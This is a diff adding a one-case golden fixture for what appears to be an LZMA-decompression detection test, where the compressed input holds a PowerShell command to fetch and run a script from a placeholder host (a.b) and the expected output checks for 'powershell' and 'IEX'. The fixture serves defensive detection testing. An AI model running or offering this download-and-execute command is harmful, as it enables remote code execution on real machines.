@@ -1,0 +1,2 @@
+# lzma-decompress · Golden Fixtures · RC3.2a
+{"case_id": "lzma-plain-ps", "description": "LZMA stream \u2192 PowerShell IEX", "input": "\u00fd7zXZ\u0000\u0000\u0004\u00e6\u00d6\u00b4F\u0002\u0000!\u0001\u0016\u0000\u0000\u0000t/\u00e5\u00a3\u0001\u0000'powershell.exe -c \"IEX http://a.b/x.ps1\"\u0000E\u000eBFQ\u000e\u00d4B\u0000\u0001@(\u00d4RJ\u00e5\u001f\u00b6\u00f3}\u0001\u0000\u0000\u0000\u0000\u0004YZ", "detect_min_confidence": 0.3, "expected_output_contains": ["powershell", "IEX"]}
